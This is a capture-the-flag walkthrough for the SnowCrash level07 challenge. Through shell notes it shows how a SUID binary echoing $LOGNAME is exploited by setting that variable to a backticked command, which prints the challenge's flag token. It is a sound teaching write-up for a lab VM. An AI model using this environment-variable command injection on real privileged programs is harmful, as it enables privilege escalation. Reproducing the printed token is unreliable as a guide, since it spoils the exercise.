@@ -1,0 +1,60 @@
+# Okay lets see what we have by doing a ls -la
+
+level07@SnowCrash:~$ ls -la
+total 24
+dr-x------ 1 level07 level07  120 Mar  5  2016 .
+d--x--x--x 1 root    users    340 Aug 30  2015 ..
+-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
+-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+
+# Lets see what happens when running the file
+
+level07@SnowCrash:~$ ./level07
+level07
+
+# It seems as to run it's own name, Lets make sure if this assumption is true.
+#	Runnning `find / -iname "level07" 2>/dev/null` returns nothing
+
+# Lets see what is in the env
+
+level07@SnowCrash:~$ env
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=192.168.56.1 49342 			# Note that this changes after every new creation of the vm
+SSH_TTY=/dev/pts/0
+USER=level07
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
+MAIL=/var/mail/level07
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+PWD=/home/user/level07
+LANG=en_US.UTF-8
+SHLVL=7
+HOME=/home/user/level07
+LOGNAME=level07
+SSH_CONNECTION=192.168.56.1 49342 192.168.56.101 4242
+LC_CTYPE=UTF-8
+LESSOPEN=| /usr/bin/lesspipe %s
+LESSCLOSE=/usr/bin/lesspipe %s %s
+OLDPWD=/home/user/level06
+_=/usr/bin/env
+
+# We see something interesting in this. Take a look at the $LOGNAME variable. It the same out put as the the executable ./level07.
+# 	We shell try to change it and see what happens, using our "trusted" friend /bin/echo
+# If we run strings on this we also see that it confirms that it uses $LOGNAME
+
+# We are going to assume that they simply export the env variable $LOGNAME, which is the current user name.
+#	WE will test this by changing the env variable.
+
+level07@SnowCrash:~$ export LOGNAME=Gabe; ./level07
+Gabe
+level07@SnowCrash:~$ ./level07
+Gabe
+
+# Bingo we were right! Now lets get that flag!
+
+level07@SnowCrash:~$ export LOGNAME=\`getflag\`; ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+# This work again because it has SUID set
